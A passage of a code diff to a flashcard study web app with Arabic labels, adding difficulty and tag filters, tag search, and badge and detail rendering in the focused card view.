                                 <button class="card-action-btn btn-need-review" onclick="setCardState(${card.id}, 'review')">🔄 مراجعة</button>
                                 <button class="card-action-btn btn-mastered" onclick="setCardState(${card.id}, 'mastered')">✅ حفظت</button>
@@ -1259,13 +2357,14 @@
         window.setCardState = function(id, state) {
             cardStates[id] = state;
             saveStates();
-            // Optional: immediately update status display in the card if in grid view
             applyFilters();
         }
 
-        // Apply Filters (Search, Category, State)
+        // Apply Filters (Search, Category, Difficulty, Tag, State)
         function applyFilters() {
             const catVal = document.getElementById('categoryFilter').value;
+            const diffVal = document.getElementById('difficultyFilter').value;
+            const tagVal = document.getElementById('tagFilter').value;
             const stateVal = document.getElementById('stateFilter').value;
             const searchVal = document.getElementById('cardSearch').value.trim().toLowerCase();
 
@@ -1273,6 +2372,12 @@
                 // Category match
                 const catMatch = (catVal === 'all' || card.cat === catVal);
                 
+                // Difficulty match
+                const diffMatch = (diffVal === 'all' || card.difficulty === diffVal);
+                
+                // Tag match
+                const tagMatch = (tagVal === 'all' || card.tags.includes(tagVal));
+
                 // State match
                 const stateMatch = (stateVal === 'all' || 
                                     (stateVal === 'unstarted' && cardStates[card.id] === 'unstarted') ||
@@ -1283,9 +2388,10 @@
                 const searchMatch = (!searchVal || 
                                      card.q.toLowerCase().includes(searchVal) || 
                                      card.a.toLowerCase().includes(searchVal) || 
-                                     card.cat.toLowerCase().includes(searchVal));
+                                     card.cat.toLowerCase().includes(searchVal) ||
+                                     card.tags.some(t => t.toLowerCase().includes(searchVal)));
 
-                return catMatch && stateMatch && searchMatch;
+                return catMatch && diffMatch && tagMatch && stateMatch && searchMatch;
             });
 
             if (currentView === 'grid') {
@@ -1308,8 +2414,9 @@
                     document.getElementById('focusCardCat').innerText = "";
                     document.getElementById('focusCardCatBack').innerText = "";
                     document.getElementById('focusProgressText').innerText = "0 / 0";
-                    document.getElementById('focusCardIndex').innerText = "";
-                    document.getElementById('focusCardIndexBack').innerText = "";
+                    document.getElementById('focusCardBadgesFront').innerHTML = "";
+                    document.getElementById('focusCardTagsFront').innerHTML = "";
+                    document.getElementById('focusCardDetails').innerHTML = "";
                     document.getElementById('focusCardActions').innerHTML = "";
                     return;
                 }
@@ -1321,8 +2428,16 @@
                 document.getElementById('focusCardA').innerHTML = card.a;
                 document.getElementById('focusProgressText').innerText = `${currentFocusIndex + 1} / ${filteredCards.length}`;
                 
-                document.getElementById('focusCardIndex').innerText = `بطاقة ${currentFocusIndex + 1} / ${filteredCards.length}`;
-                document.getElementById('focusCardIndexBack').innerText = `بطاقة ${currentFocusIndex + 1} / ${filteredCards.length}`;
+                // Badges and tags
+                const usedInHtml = card.usedIn.map(u => `<span class="badge-usedin">${u}</span>`).join(' ');
+                document.getElementById('focusCardBadgesFront').innerHTML = `
+                    <span class="badge-difficulty diff-${card.difficulty}">${card.difficulty}</span>
+                    ${usedInHtml}
+                `;
+                document.getElementById('focusCardTagsFront').innerHTML = card.tags.map(t => `<span class="badge-tag">${t}</span>`).join(' ');
+
+                // Details
+                document.getElementById('focusCardDetails').innerHTML = renderDetails(card);
 
                 // Set actions
                 document.getElementById('focusCardActions').innerHTML = `
@@ -1361,6 +2476,8 @@
 
             // Event Listeners
             document.getElementById('categoryFilter').addEventListener('change', applyFilters);
+            document.getElementById('difficultyFilter').addEventListener('change', applyFilters);
+            document.getElementById('tagFilter').addEventListener('change', applyFilters);
             document.getElementById('stateFilter').addEventListener('change', applyFilters);
             document.getElementById('cardSearch').addEventListener('input', applyFilters);
         });
